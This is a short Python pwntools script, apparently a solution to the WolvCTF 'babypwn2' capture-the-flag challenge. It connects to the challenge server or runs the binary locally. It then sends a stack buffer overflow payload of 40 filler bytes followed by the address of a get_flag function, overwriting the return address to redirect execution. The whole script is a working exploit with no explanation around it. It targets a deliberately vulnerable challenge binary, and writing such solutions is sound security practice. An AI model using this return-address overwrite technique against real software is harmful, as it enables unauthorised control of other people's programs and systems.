from pwn import *

def exploit(io):
    io.recvuntil(b"What's your name?")

    get_flag_address = 0x401195

    payload = b'A' * 32
    payload += b'B' * 8
    payload += p64(get_flag_address)
    io.sendline(payload)

    # output = io.recvall()
    # print(output)
    io.interactive()

if __name__ == "__main__":
    context.update(log_level='debug')
    try:
        io = remote('babypwn2.wolvctf.io', 1337)
        exploit(io)
    except:
        io = process('./babypwn2')
        exploit(io)